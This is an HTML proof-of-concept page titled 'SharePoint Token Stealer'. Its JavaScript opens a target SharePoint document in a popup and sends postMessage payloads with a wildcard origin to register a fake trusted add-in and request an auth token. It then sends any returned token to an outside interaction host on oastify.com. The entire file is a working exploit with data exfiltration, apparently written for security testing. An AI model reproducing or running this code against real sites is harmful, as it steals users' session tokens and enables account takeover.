<!DOCTYPE html>
<html>
<head> <title>SharePoint Popup Exploit V6</title> </head>
<body>
    <h1>SharePoint Token Stealer (Popup Method)</h1>
    <button onclick="startExploit()">Step 1: Open Target & Attack</button>
    <div id="status">Waiting...</div>

    <script>
        const targetUrl = "https://shiscolinotests-my.sharepoint.com/personal/shiscolino_shiscolinotests_onmicrosoft_com/_layouts/15/Doc.aspx?sourcedoc={aafd58b8-f1a2-439e-94f0-d4ac217eea09}&action=default";
        const targetOrigin = "https://shiscolinotests-my.sharepoint.com";
        const exploitId = "HACKER_POPUP";
        let popup = null;

        function startExploit() {
            // Open target in a new window (shares session cookies!)
            popup = window.open(targetUrl, "sharepointTarget", "width=800,height=600");
            document.getElementById("status").innerText = "Popup opened. Waiting 5s for load...";

            // Wait for load, then fire
            setTimeout(() => {
                runExploit();
            }, 5000);
        }

        function runExploit() {
            if (!popup) return;
            console.log("Launching attack...");
            document.getElementById("status").innerText = "Sending payloads...";

            // Helper to send to popup
            function send(payload) {
                try { popup.postMessage(payload, "*"); } catch(e) {}
                try { popup.postMessage(JSON.stringify(payload), "*"); } catch(e) {}
            }

            // 1. Register
            send({
                MessageId: "AddinTrustedOrigin",
                AddinTrustId: exploitId
            });

            // 2. Request Token (Keep trying)
            let attempts = 0;
            const interval = setInterval(() => {
                attempts++;
                if (attempts > 10) clearInterval(interval);
                
                send({
                    MessageId: "GetAuthToken",
                    Values: {
                        AddinTrustId: exploitId,
                        Resource: window.location.origin
                    }
                });
                console.log("Attempt " + attempts);
            }, 1000);
        }

        // 3. Listen for Token
        window.addEventListener("message", (event) => {
            if (event.data && event.data.MessageId === "GetAuthTokenResponse") {
                const token = event.data.Values ? event.data.Values.Token : event.data.Token;
                if (token) {
                    console.log("SUCCESS! Token:", token);
                    alert("Token Stolen! See Console.");
                    fetch('https://cm237ixc7usjxquw38ghh91krbx2ls9h.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
                }
            }
        });
    </script>
</body>
</html>
